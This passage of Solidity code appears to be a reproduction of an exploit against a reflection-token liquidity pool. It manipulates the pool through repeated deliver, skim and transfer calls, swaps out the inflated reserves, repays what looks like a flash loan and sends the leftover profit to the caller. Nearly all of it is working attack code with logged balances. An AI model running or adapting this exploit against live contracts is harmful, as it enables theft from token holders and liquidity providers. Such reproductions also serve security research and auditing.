            arr69[0] = xc02a;
            arr69[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(99936436288943, v73, arr69, x4b90, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
        }
        {
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v76 = 13305224314944710828044;
            uint256 v76 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305224314944710828044 (13305.2243 ether)");
            // uint256 v77 = 9999999999999999000;
            uint256 v77 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999999000 (9.9999 ether)");
            // uint256 v78 = 1000000013477464372531;
            uint256 v78 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000000013477464372531 (1000.1347 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v79 = 13305224314944710828044;
            uint256 v79 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305224314944710828044 (13305.2243 ether)");
            // uint256 v80 = 9999999999999999000;
            uint256 v80 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999999000 (9.9999 ether)");
            // uint256 v81 = 1000003133854980001024;
            uint256 v81 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000003133854980001024 (1000.3133 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v82 = 13305224314944710828044;
            uint256 v82 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305224314944710828044 (13305.2243 ether)");
            // uint256 v83 = 9999999999999999000;
            uint256 v83 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999999000 (9.9999 ether)");
            // uint256 v84 = 1000093928989957173819;
            uint256 v84 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000093928989957173819 (1000.9392 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            I(xb1f4).reflectionFromToken(1000000000000000000000, false);
            I(xb1f4).tokenFromReflection(17000000000000000000000);
            I(xb1f4).deliver(929831105263157894736);
            // uint256 v85 = 1058654910158030342733;
            uint256 v85 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1058654910158030342733 (1058.6549 ether)");
            I(xb1f4).transfer(x30ac, 1005458559577499476041);
            // uint112 v86 = 9999999999999999000;
            // uint112 v87 = 6745303108216541709529;
            // uint32 v88 = 1683643823;
            (uint112 v86, uint112 v87, uint32 v88) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v86, v87, v88);
            // uint256 v89 = 6745303108216541709529;
            uint256 v89 = I(xc02a).balanceOf(x30ac);
            console2.log("I(xc02a).balanceOf(x30ac)\t->", "6745303108216541709529 (6745.3031 ether)");
            // uint256 v90 = 1999825407239499037876;
            uint256 v90 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "1999825407239499037876 (1999.8254 ether)");
            I(x30ac).swap(0, 6711472664385159447655, r, "");
            I(xc02a).transfer(xba12, 20000000000000000000000);
        }
        {
            // uint256 v91 = 16696979329870275699;
            uint256 v91 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "16696979329870275699 (16.6969 ether)");
            I(xc02a).transfer(tx.origin, v91);
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
